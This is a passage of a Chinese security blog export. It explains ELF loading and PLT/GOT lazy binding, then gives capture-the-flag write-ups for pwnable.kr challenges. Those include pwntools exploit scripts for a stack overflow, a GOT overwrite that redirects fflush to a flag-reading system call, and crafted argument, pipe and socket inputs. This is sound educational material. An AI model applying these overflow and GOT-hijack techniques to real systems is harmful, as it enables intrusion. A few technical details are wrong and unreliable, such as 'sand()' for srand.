操作系统一般会对这些页面做两次映射，以保证每个段的内存访问许可是相同的。数据段的末尾需要对未初始化数据进行特殊处理，系统应该将这些初始化为0 可执行文件与共享目标文件之间的段加载之间有一点不同。可执行文件的段通常包含绝对代码，为了能够让进程正确执行，所使用的段必须是构造可执行文件时所使用的虚拟地址。因此系统会使用p_vaddr作为虚拟地址。 另外，共享目标文件的段通常包含与位置无关的代码。这使得段的虚拟地址在不同的进程中不同，但不影响执行行为。尽管系统为每个进程选择独立的虚拟地址，仍能维持段的相对位置。因为位置独立的代码在段与段之间使用相对寻址，内存虚地址之间的差异必须与文件中虚拟地址之间的差异相匹配。 程序解释器 可执行文件可以包含PT_INTERP程序头部元素。在exec() 期间，系统从PT_INTERP段中检索路径名，并从解释器文件的段创建初始的进程映像。也就是说，系统并不使用原来可执行文件的段映像，而是为解释器构造一个内存映像。接下来是解释器从系统接收控制，为应用程序提供执行环境。 解释器可以有两种方式接受控制： 接受一个文件描述符，读取可执行文件并将其映射到内存中 根据可执行文件的格式，系统可能把可执行文件加载到内存中，而不是为解释器提供一个已经打开的文件描述符。 共享目标文件被加载到内存中时，其地址可能在各个进程中呈现不同的取值。系统在 mmap 以及相关服务所使用的动态段区域创建共享目标文件的段。因此，共享目标解释器通常不会与原来的可执行文件的原始段地址发生冲突。 可执行文件被加载到内存中固定地址，系统使用来自其程序头部表的虚拟地址创建各个段。因此，可执行文件解释器的虚拟地址可能会与原来的可执行文件的虚拟地址发生冲突。解释器要负责解决这种冲突。 动态加载程序 在构造使用动态链接技术的可执行文件时，连接编辑器向可执行文件中添加一个类型为PT_INTERP的程序头部元素，告诉系统要把动态链接器激活，作为程序解释器。系统所提供的动态链接器的位置是和处理器相关的。 Exec() 和动态链接器合作，为程序创建进程映像，其中包括以下动作： (1).将可执行文件的内存段添加到进程映像中； (2).把共享目标内存段添加到进程映像中； (3).为可执行文件和它的共享目标执行重定位操作； (4).关闭用来读入可执行文件的文件描述符，如果动态链接程序收到过这样的文件描述符的话； (5).将控制转交给程序，使得程序好像从 exec 直接得到控制。 PLT&amp;GOT 位置独立的代码一般不能包含绝对的虚拟地址。全局偏移表在私有数据中包含绝对地址，从而使得地址可用，并且不会影响位置独立性和程序代码的可共享性。程序使用位置独立的寻址引用其全局偏移表，并取得绝对值，从而把位置独立的引用重定向到绝对位置。 全局偏移表中最初包含其重定位项中要求的信息。在系统为可加载目标创建内存段以后，动态链接器要处理重定位项，其中有一些重定位项的类型是R_386_GLOB_DAT，是对全局偏移表的引用。动态链接器确定相关的符号取值，计算其绝对地质，并将相应的内存表格项目设置为正确的数值。尽管在链接编辑器构造一个目标文件时还无法知道绝对地质，动态链接器清楚所有内存段的地址，因而能够计算其中所包含的符号的绝对地址。 全局偏移表（GOT，）用来将位置独立的地址计算重定向到绝对位置，与此相似，过程链接表（PLT）能够把位置独立的函数调用重定向到绝对位置。链接编辑器物能解析从一个可执行文件/共享目标到另一个可执行文件/共享目标控制转移（例如函数调用）。因此，链接编辑器让程序把控制转移给过程链接表中的表项。在System V中，过程链接表位于共享正文中，不过它们使用位于私有的全局偏移表中的地址。 动态链接器能够确定目标处的绝对地址，并据此修改全局偏移表的内存映像。动态链接器因此能够对表项进行重定位，并且不会影响程序代码的位置独立性和可共享性。可执行文件和共享目标文件拥有各自独立的过程链接表。 绝对过程链接表： 位置独立的过程链接表： 如图所示，过程链接表命令针对绝对代码（图 1）和位置独立的代码（图 2）使用不同的操作数寻址模式。尽管如此，它们对动态链接器的接口还是相同的。 动态链接器和程序“合作”，通过过程链接表和全局偏移表解析符号引用： 1.在第一次创建程序的内存映像时，动态链接器为全局偏移表的第二和第三项设置特殊值。 2.如果过程链接表是位置独立的，全局偏移表必须位于 %bx 中，进程映像中的每个共享目标文件都有自己的过程链接表，控制向过程链接表项的传递仅发生在同一个目标文件中。因此，调用函数用负责在调用过程链接表项之前设置全局偏移表的基址寄存器。 3.出于说明的目的，假定程序调用了 name1，name1 将控制传输给标号 .PLT1。 4.第一条指令跳转到 name1 的全局偏移表项的地址。最初，全局偏移表中包含后面的 pushl 指令的地址，而不是 name1 的真实地址。 5.接下来，程序将重定位偏移（offset）压栈。重定位偏移是一个 32 位非负数，是在重定位表中的字节偏移量。指定的重定位表项的类型为 R_386_JMP_SLOT，其偏移将给出在前面的 jmp 指令中使用的 GOT 表项。重定位项也包含一个符号表索引，借以告诉动态链接器被引用的符号是什么，在这里是 name1。 6.在将重定位偏移压栈后，程序会跳转到 .PLT0，也就是过程链接表的第一项。pushl 指令把第二个全局偏移表项（got_plus_4 或者 4(%ebx)）压入堆栈，因而为动态链接器提供了识别信息的机会。程序然后跳转到第三个 GOT 表项内保存的地址（got_plus_8 或者 8(%ebx)），后者将控制传递给动态链接器。 7.当动态链接器得到控制后，它恢复堆栈，查看指定的重定位项，寻找符号的值，将 name1 的“真实”地址存储于全局偏移表项中，并将控制传递给期望的目的地。 8.过程链接表项的后续执行将把控制直接传递给 name1，不会再次调用动态链接器。就是说 .PLT1 处的 jmp 将控制传递给 name1，而不会执行后面的 pushl 指令。 环境变量LD_BIND_NOW可以更改动态链接行为。如果其取值非空，动态链接器会在控制传递给程序之前，对过程链接表项进行计算。就是说动态链接器会在进程初始化的过程中处理类型为R_386_JMP_SLOT的重定位项。否则，动态链接器会对过程链接表实行懒惰计算，延迟符号解析和重定位，直到某个表项的第一次执行。 延迟绑定通常会提供整体的应用性能，因为未使用的符号不会引入额外的动态链接开销。尽管如此，有些应用情形会使得懒惰绑定不太合适。首先，对共享目标函数的第一次引用花的时间会超出后续调用，因为动态链接器要截获调用以便解析符号。一些应用不能容忍这种不可预测性。第二，如果发生了错误，动态链接器无法解析某个符号，动态链接器会终止程序。在懒惰绑定下，这类事情可能会发生任意多次。某些应用也可能无法容忍这种不可预测性。通过关闭懒惰绑定，动态链接器会迫使所有错误都发生在进程初始化期间，而不是应用程序接收控制以后。 Demo: 来看一个编译好的32位ELF可执行文件对libc.so的函数fgets()进行调用的例子。32位可执行文件与GOT的关系比较容易观察，因为在32位文件中没有用到IP相对地址，IP相对地址是在64位可执行文件中使用的: 18048481: e8 da fe ff ff call 8048360&lt;fgets@plt&gt; 地址0x8048360对应函数fgets()的PLT条目。接下来观察可执行文件中地址为0x8048360的内容： 123408048360&lt;fgets@plt&gt;: &#x2F;* A jmp into the GOT *&#x2F; 8048360: ff 25 00 a0 04 08 jmp *0x804a000 8048366: 68 00 00 00 00 push $0x0 804836b: e9 e0 ff ff ff jmp 8048350 &lt;_init+0x34&gt; 对函数fgets()的调用会指向地址0x8048360，即函数fgets()的PLT跳转表条目。从前面反编译代码的输出中可以看到，有一个间接跳转指向存放在0x804a000中的地址，这个地址就是GOT条目，存放着libc共享库中函数fgets()的实际地址。 然而，动态链接器采用默认的延迟链接方式时，不会在函数第一次调用时就对地址进行解析。延迟链接意味着动态链接器不会在程序加载时解析每一个函数，而是在调用时通过.plt和.got.plt节（分别对应各自的过程链接表和全局偏移表）来对函数进行解析。可以通过修改LD_BIND_NOW环境变量将链接方式修改为严格加载，以便在程序加载的同时进行动态链接。动态链接器之所以默认采用延迟链接的方式，是因为延迟链接能够提高装载时的性能。不过，有时候有些不可预知的链接错误可能在程序运行一段时间后才能够发现。我在过去几年里也就碰到过一次这种情况。值得注意的是，有些安全特性，如只读重定位，只能在严格链接的模式下使用，因为.plt.got节是只读的。在动态链接器完成对.plt.got的补充之后才能够进行只读重定位，因此必须使用严格链接。 设函数fgets()是第一次被调用，动态链接器需要对fgets()的地址进行解析，并把值存入fgets()的GOT条目中。 1234567808049ff4 &lt;_GLOBAL_OFFSET_TABLE_&gt;: 8049ff4: 28 9f 04 08 00 00 sub %bl,0x804(%edi) 8049ffa: 00 00 add %al,(%eax) 8049ffc: 00 00 add %al,(%eax) 8049ffe: 00 00 add %al,(%eax) 804a000: 66 83 04 08 76 addw $0x76,(%eax,%ecx,1) 804a005: 83 04 08 86 addl $0xffffff86,(%eax,%ecx,1) 804a009: 83 04 08 96 addl $0xffffff96,(%eax,%ecx,1) 804a00d: 83 .byte 0x83 804a00e: 04 08 add $0x8,%al 重点注意地址0x08048366，该地址存储在GOT的0x804a000中。在低字节序中，低位字节排放在内存的低地址端，因此看上去是66 83 04 08。由于链接器还未对函数fgets()进行解析，故该地址并不是函数的地址，而是指向函数fgets()的PLT条目。再来看一下函数fgets()的PLT条目： 1234508048360 &lt;fgets@plt&gt;: 8048360: ff 25 00 a0 04 08 jmp *0x804a000 8048366: 68 00 00 00 00 push $0x0 804836b: e9 e0 ff ff ff jmp 8048350 &lt;_init+0x34&gt; 因此，jmp *0x804a000 指令会跳转到地址0x804a000 中存放的0x8048366，即push $0x0指令。该push指令的作用是将fgets()的GOT条目入栈。fgets()的GOT条目偏移地址为0x0，对应的第一个GOT条目是为一个共享库符号值保留的，0x0实际上是第4个GOT条目，即GOT[3]。换句话说，共享库的地址并不是从GOT[0]开始的，而是从GOT[3]开始的，前3个条目是为其他用途保留的。 下面是GOT的3个偏移量。 GOT[0]：存放了指向可执行文件动态段的地址，动态链接器利用该地址提取动态链接相关的信息。 GOT[1]：存放link_map结构的地址，动态链接器利用该地址来对符号进行解析。 GOT[2]：存放了指向动态链接器_dl_runtime_resolve()函数的地址，该函数用来解析共享库函数的实际符号地址。 fgets()的PLT存根（stub）的最后一条指令是jmp 8048350。该地址指向可执行文件的第一个PLT条目，即P LT- 0。 我们的可执行文件的P LT- 0存放了下面的代码： 1238048350: ff 35 f8 9f 04 08 pushl 0x8049ff8 8048356: ff 25 fc 9f 04 08 jmp *0x8049ffc 804835c: 00 00 add %al,(%eax) 第一条pushl指令将GOT[1]的地址压入栈中，前面提到过，GOT[1]中存放了指向link_map结构的地址. jmp *0x8049ffc指令间接跳转到第3个GOT条目，即GOT[2]，在GOT[2]中存放了动态链接器_dl_runtime_resolve()函数的地址，然后将控制权转给动态链接器，解析fgets()函数的地址。对函数fgets()进行解析后，后续所有对PLT条目fgets()的调用都会跳转到fgets()的代码本身，而不是重新指向PLT，再进行一遍延迟链接的过程。 1．调用fgets@PLT（即调用fgets函数）。 2．PLT代码做一次到GOT中地址的间接跳转。 3．GOT条目存放了指向PLT的地址，该地址存放在push指令中。 4．push $0x0指令将fgets() GOT条目的偏移量压栈。 5．最后的fgets() PLT指令是指向P LT- 0代码的jmp指令。 6．P LT- 0的第一条指令将GOT[1]的地址压栈，GOT[1]中存放了指向fgets()的link_map结构的偏移地址。 7．P LT- 0的第二条指令会跳转到GOT[2]存放的地址，该地址指向动态链接器的_dl_runtime_resolve函数，_dl_runtime_resolve函数会通过把fgets()函数的符号值加到.got.plt节对应的GOT条目中，来处理R_386_JUMP_SLOT重定位。 下一次调用fgets()函数时，PLT条目会直接跳转到函数本身，而不是再执行一遍重定位过程。 图示： 第一次动态链接该函数 之后：","categories":[{"name":"linux","slug":"linux","permalink":"http://example.com/categories/linux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"http://example.com/tags/linux/"},{"name":"ELF文件","slug":"ELF文件","permalink":"http://example.com/tags/ELF%E6%96%87%E4%BB%B6/"}]},{"title":"Pwnable_game题解_1","slug":"Pwnablekr_1","date":"2021-07-15T17:24:39.000Z","updated":"2022-03-25T14:31:46.000Z","comments":true,"path":"2021/07/16/Pwnablekr_1/","link":"","permalink":"http://example.com/2021/07/16/Pwnablekr_1/","excerpt":"","text":"Pwnable_games开始刷题啦！冲冲冲！本贴记录主要记录知识点和exp fdTips: main函数的三个参数 int argc int型变量，表示传递给main函数的参数数量。 char *argv 指针数组，每个指针指向各个具体的参数。 char*envp 环境变量，可以为程序运行过程中需要使用环境变量做参考。 Demo: 1$ ./hello //执行该文件 此时argc=1,表示只有一个参数输入 argv只有一个元素,argv[0]指向输入程序路径及名称: ./hello 1$ ./hello para_1 此时argc=2,有两个参数传入 argc[0]指向输入程序路径及名称 “./hello” argv[1]指向para_1字符串 Linux 文件IO部分理解 所有的I/O设备都被模型化为文件，而所有的输入和输出都被当做相应文件的读和写来执行。这种将设备优雅映射为文件的方式，允许Linux内核引出一个简单、低级的应用接口，称为Unix I/O，这使得所有输入和输出都能以一种统一、一致的方式来执行： 打开文件 ： 应用程序通过内核打开相应文件，内核返回一个小的非负整数，叫做描述符，它在后续对此文件的所有操作中标识这个文件。内核记录有关打开文件的所有信息。应用程序只需记住这个描述符。 文件描述符fd： 文件描述符在形式上是一个非负整数。实际上，它是一个索引值，指向内核为每一个进程所维护的该进程打开文件的记录表。当程序打开一个现有文件或者创建一个新文件时，内核向进程返回一个文件描述符。 Linux shell创建的每个进程开始时都有三个打开的文件： 12345stdin 标准输入的文件标识符为0 stdout 标准输出的文件标识符为1stderr 标准错误输出的文件标识符为2 Exp: 1234567891011#coding=utf-8from pwn import *payload=str(0x1234)shell=ssh(host=&#x27;pwnable.kr&#x27;,user=&#x27;fd&#x27;,password=&#x27;guest&#x27;,port=2222)#shell.download_file(&#x27;fd.c&#x27;)sh = shell.run(&#x27;./fd&#x27;+&#x27; &#x27;+payload)payload=&quot;LETMEWIN&quot;sh.sendline(payload)sh.interactive() collisionTips: 跟哈希相关不大（× 可能是我没有get到出题人的意思 思路很简单，用hashcode的值除以5，再依次加起来就好了。0x21DD09EC的十进制表示是568134124，它并不能被5整除，所以我们用一个小技巧，先加1，再除以5，最后将其中一个数值再减1即可。 具体计算方法为： 12(568134124 + 1) / 5 = 113626825 = 0x6C5CEC90x21DD09EC = 0x6C5CEC9 + 0x6C5CEC9 + 0x6C5CEC9 + 0x6C5CEC9 + 0x6C5CEC8 那么argv[1]的字符串，就应该是一个由相应十六进制数值组成的字符串，表示如下： 1\\xc9\\xce\\xc5\\x06\\xc9\\xce\\xc5\\x06\\xc9\\xce\\xc5\\x06\\xc9\\xce\\xc5\\x06\\xc8\\xce\\xc5\\x06 这里采用小端存储方式。 小端存储：高字节保存在内存高地址，低字节保存在内存低地址中 这个解释依旧十分笼统，为什么int型数据以小端存储就要每个int型数据逆序输入 下面两张图说明问题：（×其实还并不能说明问题 但是我们并不知道输入的命令行参数在内存存储的增长方向😀 各种Google均无果。。无奈下手动测试一下。 Test Code: 12345678910 #include&lt;stdio.h&gt; int main(int argc,char* argv[],char* env[]) &#123;for(int i=0;i&lt;=2;i++) printf(&quot;argv[%d]:%p\\n&quot;,i,argv[i]); int i=0; printf(&quot;stack:%p\\n&quot;,&amp;i); printf(&quot;env:%p\\n&quot;,env[i]); return 0; &#125; 实践出真知: 输入的argv[1]存储在栈上和内核空间之间，并且由低地址向高地址增长。 那么就很容易明白为什么逆序输入int四个字节了。 以为0x6C5CEC9和0x6C5CEC8为例 我们传入命令行参数argv[1]对应的字节序列为 \\xc9\\xce\\xc5\\x06\\x12\\x34\\x56\\x78实际存储时如下方式存储如下： 高地址8 78高地址7 56高地址6 34高地址5 12高地址4 06高地址3 c5高地址2 ce高地址1 c9 int型号指针ip指向高地址1 那么由于int型号为小端存储，四个字节依次读取 ip[i]=0x06C5CEC9 ip[2]=0x78563412 网上大部分解析只是简单说明int数据小端存储，但是单单知道这个是不足以得出逆序输入的结论，必须知道命令行参数存储结构。 以上内容原创。转载注明出处。 PS：部分字节没有对应ASCII码，我们需要直接向argv[1]中写入字节，可以用python实现 Demo: 1`python -c print &#x27;\\xAB\\xCD&#x27;` Exp: 12345678#coding=utf-8from pwn import *payload=p32(0x6c5cec9)*4+p32(0x6c5cec8)shell=ssh(host=&#x27;pwnable.kr&#x27;,user=&#x27;col&#x27;,password=&#x27;guest&#x27;,port=2222)sh = shell.run(&#x27;./col&#x27;+&#x27; &#x27;+payload)sh.interactive() bofAnalyse: get简单的溢出 IDA静态查看arg[1]和数组key对应的VA地址，计算出偏移为0x52 Exp: 1234567#coding=utf-8from pwn import *io=remote(&quot;pwnable.kr&quot;,9000)payload=&#x27;a&#x27;*(0x2c+0x8)+p32(0xcafebabe)io.sendline(payload)io.interactive() flagAnalyse: IDA静态分析发现里面内容少得可怜..很明显是加壳了 这里需要用到strings命令，一个技巧可以获得关键的信息： 1strings -20 flag 显示flag文件中至少包含20个字符的字符串，定位关键信息： 1Info: This file is packed with the UPX executable packer http:&#x2F;&#x2F;upx.sf.net Google后简单了解了一下upx ，是个压缩壳 upx -d 解压一下即可 然后字符搜索关键词字 :) #注意此处需要转义字符 1strings flag |grep \\:\\) passcodesouce code: 1234567891011121314151617181920212223242526272829303132333435363738394041424344#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;void login()&#123; int passcode1; int passcode2; printf(&quot;enter passcode1 : &quot;); scanf(&quot;%d&quot;, passcode1); fflush(stdin); // ha! mommy told me that 32bit is vulnerable to bruteforcing :) printf(&quot;enter passcode2 : &quot;); scanf(&quot;%d&quot;, passcode2); printf(&quot;checking...\\n&quot;); if(passcode1==338150 &amp;&amp; passcode2==13371337)&#123;//这个条件一旦成立就可以pwn printf(&quot;Login OK!\\n&quot;); system(&quot;/bin/cat flag&quot;); &#125; else&#123; printf(&quot;Login Failed!\\n&quot;); exit(0); &#125;&#125;void welcome()&#123; char name[100]; printf(&quot;enter you name : &quot;); scanf(&quot;%100s&quot;, name); printf(&quot;Welcome %s!\\n&quot;, name);&#125;int main()&#123; printf(&quot;Toddler&#x27;s Secure Login System 1.0 beta.\\n&quot;); welcome(); login(); // something after login... printf(&quot;Now I can safely trust you that you have credential :)\\n&quot;); return 0;&#125; key points: scanf函数: scanf(&quot;%d&quot;, passcode1); 缺少一个&amp;这时函数执行时，会将passcode1作为地址进行写入操作，同理对应passcode2一样。一旦这两个不可控的地址是不可写或访问的，那么程序就crash了。 那么对passcode1和2地址的构造，然后利用scanf函数在该地址进行写入数据会是关键。 Analyse： 函数流程分析 welcome:可以在name数组中写入长度位100字节的字符 接下来无缝执行 login： 对passcode1地址上进行写入数据 ➡ 调用fflush(stdin); ➡ 输入passcode2 ➡check为真后输出flag 由于welcome()和login()这两个函数之间执行期间没有其他操作，可以分析得出前后进入这两个栈帧时，他们的EBP是一样的，自然可以想到我们可以领用name数组对passcode1和passcode2进行覆盖。 IDA静态分析： name数组数组的地址为：EBP-70H passcode1地址: EBP-10H passcode2地址: EBP-0cH welcome（）和login（）这两个函数栈帧的EBP一样只是我们的猜测，我们可以用gdb动态调试验证查看是否确实相同。 下载ELF文件： 1234#coding=utf-8from pwn import *shell=ssh(host=&#x27;pwnable.kr&#x27;,user=&#x27;passcode&#x27;,password=&#x27;guest&#x27;,port=2222)shell.download_file(&quot;./passcode&quot;) 修改权限 1chmod 777 passcode 查看内存保护信息： 1checksec passcode 此处的RELRO信息为关键点，关于checksec 查看内存保护信息参阅这篇： linux内存保护信息 gdb动态调试： 查看验证：确实两个函数栈帧的EBP相同，那么自然想到可以利用name数组对passcode1和2进行覆盖，但是注意到数组name大小是100字节，name首地址到passcode1首地址距离为96，我们组多能利用name数组的最后四个字节覆盖passcode1，无法覆盖到passcode2 注意到输入passcode1后，立即执行了 fflush(stdin) 【用于更新缓冲区】函数，调用这个函数的时候会利用linux的动态延迟加载。 此处需要恶补一下GOT和PLT表的关系以及linux动态延迟加载的一些只是： 参考这篇非常详细 参阅完毕后就可以进行exp Hijack GOT： 修改某个被调用函数的地址，让其指向另一个函数 这里我们修改调用fflush的地址，改为cat flag指令的地址，然后成功执行cat flag指令得到flag。 最后要做的就是找到调用fflush的地址和cat flag的地址，然后用name数组对passcode1覆盖为fflush的GOT表项地址，然后用scanf函数对GOT表象覆写为输出flag的指令即可。 找到fflush的GOT表项地址: 0x0804a004 找到cat flag 指令地址为：0x080485E3 Exp： 1234567891011#coding=utf-8from pwn import *shell=ssh(host=&#x27;pwnable.kr&#x27;,user=&#x27;passcode&#x27;,password=&#x27;guest&#x27;,port=2222)sysh_addr=0x080485E3fflush_got=0x0804a004payload=&quot;a&quot;*(100-4)+p32(fflush_got)sh=shell.run(&#x27;./passcode&#x27;)sh.sendlineafter(&quot;enter you name :&quot;,payload)payload=str(sysh_addr)sh.sendlineafter(&quot;enter passcode1 :&quot;,payload)sh.interactive() random一个C语言的知识点：如果用户在rand()之前没有调用过sand(),那么系统默认将1作为伪随机数的初始值，如果给定了一个值，那么每次rand()产生的随机数序列都是一样的。 EXP 12345678#coding=utf-8from pwn import *shell=ssh(host=&#x27;pwnable.kr&#x27;,user=&#x27;random&#x27;,password=&#x27;guest&#x27;,port=2222)payload=str(3039230856)sh=shell.run(&#x27;./random&#x27;)sh.sendline(payload)sh.interactive() input主要考察linux的一些基本参数传递，这里就当做学习python的一些模块。。 subprocess模块 Demo: 1subprocess.run(args, *, stdin=None, input=None, stdout=None, stderr=None, capture_output=False, shell=False, cwd=None, timeout=None, check=False, encoding=None, errors=None, text=None, env=None, universal_newlines=None) args：表示要执行的命令。必须是一个字符串，字符串参数列表。 stdin、stdout 和 stderr：子进程的标准输入、输出和错误。其值可以是 subprocess.PIPE、subprocess.DEVNULL、一个已经存在的文件描述符、已经打开的文件对象或者 None。subprocess.PIPE 表示为子进程创建新的管道。subprocess.DEVNULL 表示使用 os.devnull。默认使用的是 None，表示什么都不做。另外，stderr 可以合并到 stdout 里一起输出。 timeout：设置命令超时时间。如果命令执行时间超时，子进程将被杀死，并弹出 TimeoutExpired 异常。 check：如果该参数设置为 True，并且进程退出状态码不是 0，则弹 出 CalledProcessError 异常。 encoding: 如果指定了该参数，则 stdin、stdout 和 stderr 可以接收字符串数据，并以该编码方式编码。否则只接收 bytes 类型的数据。 shell：如果该参数为 True，将通过操作系统的 shell 执行指定的命令。 os模块 该模块提供了一些方便使用操作系统相关功能的函数。 fdopen()函数：创建文件对象 os.fdopen(fd, **args,\\kwargs):返回打开文件描述符 fd 对应文件的对象。类似内建 open() 函数，二者接受同样的参数。不同之处在于 fdopen() 第一个参数应该为整数。 open()函数： 打开文件对象 file 是一个 path-like object，表示将要打开的文件的路径（绝对路径或者当前工作目录的相对路径），也可以是要被封装的整数类型文件描述符。（如果是文件描述符，它会随着返回的 I/O 对象关闭而关闭，除非 closefd 被设为 False 。） open(file, mode=’r’, buffering=-1, encoding=None, errors=None, newline=None, closefd=True, opener=None) mode 是一个可选字符串，用于指定打开文件的模式。默认值是 &#39;r&#39; ，这意味着它以文本模式打开并读取。其他常见模式有：写入 &#39;w&#39; （截断已经存在的文件）；排它性创建 &#39;x&#39; ；追加写 &#39;a&#39; （在 一些 Unix 系统上，无论当前的文件指针在什么位置，所有 写入都会追加到文件末尾）。在文本模式，如果 encoding 没有指定，则根据平台来决定使用的编码：使用 locale.getpreferredencoding(False) 来获取本地编码。（要读取和写入原始字节，请使用二进制模式并不要指定 encoding。）可用的模式有： 字符 含义 &#39;r&#39; 读取（默认） &#39;w&#39; 写入，并先截断文件 &#39;x&#39; 排它性创建，如果文件已存在则失败 &#39;a&#39; 写入，如果文件存在则在末尾追加 &#39;b&#39; 二进制模式 &#39;t&#39; 文本模式（默认） &#39;+&#39; 更新磁盘文件（读取并写入） 默认的模式是 &#39;r&#39; （打开并读取文本，同 &#39;rt&#39; ）。对于二进制写入， &#39;w+b&#39; 模式打开并把文件截断成 0 字节； &#39;r+b&#39; 则不会截断。 os.pipe() 创建一个管道，返回一对分别用于读取和写入的文件描述符 (r, w)。 Demo: 123456789101112131415161718192021222324252627282930#!/usr/bin/python# -*- coding: UTF-8 -*-import os, sysprint &quot;The child will write text to a pipe and &quot;print &quot;the parent will read the text written by child...&quot;# file descriptors r, w for reading and writingr, w = os.pipe() processid = os.fork()if processid: # This is the parent process # Closes file descriptor w os.close(w) r = os.fdopen(r) print &quot;Parent reading&quot; str = r.read() print &quot;text =&quot;, str sys.exit(0)else: # This is the child process os.close(r) w = os.fdopen(w, &#x27;w&#x27;) print &quot;Child writing&quot; w.write(&quot;Text written by child...&quot;) w.close() print &quot;Child closing&quot; sys.exit(0) socket模块 这个模块提供了访问BSD套接字的接口。在所有现代Unix系统、Windows、macOS和其他一些平台上可用。 这个Python接口是用Python的面向对象风格对Unix系统调用和套接字库接口的直译：函数socket() 返回一个 套接字对象 ，其方法是对各种套接字系统调用的实现。形参类型一般与C接口相比更高级：例如在Python文件 read() 和 write() 操作中，接收操作的缓冲区分配是自动的，发送操作的缓冲区长度是隐式的。 Demo: 1socket.socket(socket_family,socket_type,protocal=0) family: 套接字家族可以使 AF_UNIX 或者 AF_INET。 type: 套接字类型可以根据是面向连接的还是非连接分为 SOCK_STREAM 或 SOCK_DGRAM。 protocol: 一般不填默认为 0。 socket_family参数： 1.基于文件类型的套接字家族 套接字家族的名字：AF_UNIX，unix一切皆文件，基于文件的套接字调用的就是底层的文件系统来取数据，两个套接字进程运行在同一机器，可以通过访问同一个文件系统间接完成通信。 2.基于网络类型的套接字家族 套接字家族的名字：AF_INET，还有AF_INET6被用于ipv6，还有一些其他的地址家族，不过，他们要么是只用于某个平台，要么就是已经被废弃，或者是很少被使用，或者是根本没有实现，所有地址家族中，AF_INET是使用最广泛的一个，python支持很多种地址家族，但是由于我们只关心网络编程，所以大部分时候我么只使用AF_INET。 type指的是套接字类型，常用的类型有： SOCK_STREAM（TCP流） SOCK_DGRAM（UDP数据报） SOCK_RAW（原始套接字）最后一个 “protocol”一般设置为“0”，也就是当确定套接字使用的协议簇和类型时，这个参数的值就为0，但是有时候创建原始套接字时，并不知道要使用的协议簇和类型，也就是domain参数未知情况下，这时protocol这个参数就起作用了，它可以确定协议的种类。 socket是一个函数，那么它也有返回值，当套接字创建成功时，返回套接字，失败返回“-1”，错误代码则写入“errno”中。 一些socket函数: socket.connect(adress): 连接到 address 处的远程套接字。address 的格式取决于地址簇) socket.send(bytes[,flags]) 发送数据给套接字。本套接字必须已连接到远程套接字。 socket.close(fd) 关闭一个套接字文件描述符。它类似于os.close()，但是专用于套接字 Exp: 在/temp文件夹发现的python写的exp… 123456789101112131415161718192021222324252627282930313233343536373839#argc=100#argv[&#x27;A&#x27;]=&#x27;x00&#x27;#argv[&#x27;B&#x27;]=&#x27;\\x20\\x0a\\x0d&#x27;argc = list(&#x27;A&#x27;) * 100argc[ord(&#x27;A&#x27;)] = &#x27;&#x27;argc[ord(&#x27;B&#x27;)] = b&#x27;\\x20\\x0a\\x0d&#x27; #set socket portargc[ord(&#x27;C&#x27;)] = &quot;5555&quot;argc[0] = &#x27;/home/input2/input&#x27;#2import osstdin_r, stdin_w = os.pipe()stderr_r, stderr_w = os.pipe()os.write(stdin_w, b&#x27;\\x00\\x0a\\x00\\xff&#x27;)os.write(stderr_w, b&#x27;\\x00\\x0a\\x02\\xff&#x27;)#3environ = &#123;b&#x27;\\xde\\xad\\xbe\\xef&#x27; : b&#x27;\\xca\\xfe\\xba\\xbe&#x27;&#125;#4f = open(b&#x27;\\x0a&#x27;,&#x27;wb&#x27;)f.write(b&#x27;\\x00\\x00\\x00\\x00&#x27;)f.close()import subprocessimport timesh = subprocess.Popen(argc, stdin = stdin_r, stderr = stderr_r, env = environ)time.sleep(2)#5import sockets = socket.socket(socket.AF_INET, socket.SOCK_STREAM)s.connect((&#x27;127.0.0.1&#x27;,5555))s.send(b&#x27;\\xde\\xad\\xbe\\xef&#x27;)s.close() 另外一个Tips： t权限（粘着位SBIT）：任何人在该目录下有写权限，但是普通用户不能删除别人的文件 查看到tmp目录下普通用户有-wt权限，我们进入tmp目录后创建自己的一个目录然后执行a.py 注意到当前目录下并没有flag，我们需要创建软连接 1ln /home/input/flag flag legARM汇编： 这篇一步到位。点我 1234567891011(gdb) disass key1Dump of assembler code for function key1: 0x00008cd4 &lt;+0&gt;: push &#123;r11&#125; ; (str r11, [sp, #-4]!) 0x00008cd8 &lt;+4&gt;: add r11, sp, #0 0x00008cdc &lt;+8&gt;: mov r3, pc 0x00008ce0 &lt;+12&gt;: mov r0, r3 0x00008ce4 &lt;+16&gt;: sub sp, r11, #0 0x00008ce8 &lt;+20&gt;: pop &#123;r11&#125; ; (ldr r11, [sp], #4) 0x00008cec &lt;+24&gt;: bx lrEnd of assembler dump. 1.返回值存储在r0寄存器 ARM处理器有两种工作状态：ARM状态和Thumb状态。处理器可以在两种状态下随意切换。 处于ARM状态时，执行32位字对齐的ARM指令。 处于Thumb状态时，执行16位对齐的Thumb指令。 2.两种工作状态： ARM 和 Thumb 指令集的动态切换，是通过 BX 指令使用一个寄存器名作为参数来完成。程序控制权被转交给该寄存器中存储的地址 ( LSB 位被屏蔽 )。 如果 LSB=1, 则进入 Thumb 指令处理模式； 如果 LSB=0, 则进入 ARM 指令处理模式。 通俗点讲其实就是BX 跳转的地址最低位为1还是0来判断是进入Thumb指令处理模式还是进人ARM指令处理模式 3.Thumb模式下PC值=当前指令地址值+8 key1=0x00008cdc+8 1234567891011121314151617(gdb) disass key2Dump of assembler code for function key2: 0x00008cf0 &lt;+0&gt;: push &#123;r11&#125; ; (str r11, [sp, #-4]!) 0x00008cf4 &lt;+4&gt;: add r11, sp, #0 0x00008cf8 &lt;+8&gt;: push &#123;r6&#125; ; (str r6, [sp, #-4]!) 0x00008cfc &lt;+12&gt;: add r6, pc, #1 0x00008d00 &lt;+16&gt;: bx r6 ;此时r6最后一位是1,进入ARM thumb模式 pc&#x3D;adress+4 0x00008d04 &lt;+20&gt;: mov r3, pc 0x00008d06 &lt;+22&gt;: adds r3, #4 0x00008d08 &lt;+24&gt;: push &#123;r3&#125; 0x00008d0a &lt;+26&gt;: pop &#123;pc&#125; 0x00008d0c &lt;+28&gt;: pop &#123;r6&#125; ; (ldr r6, [sp], #4) 0x00008d10 &lt;+32&gt;: mov r0, r3 0x00008d14 &lt;+36&gt;: sub sp, r11, #0 0x00008d18 &lt;+40&gt;: pop &#123;r11&#125; ; (ldr r11, [sp], #4) 0x00008d1c &lt;+44&gt;: bx lrEnd of assembler dump. 这里返回值由r3传入。然后再看一下地址 0x00008d00 &lt;+16&gt;这里，有个bx 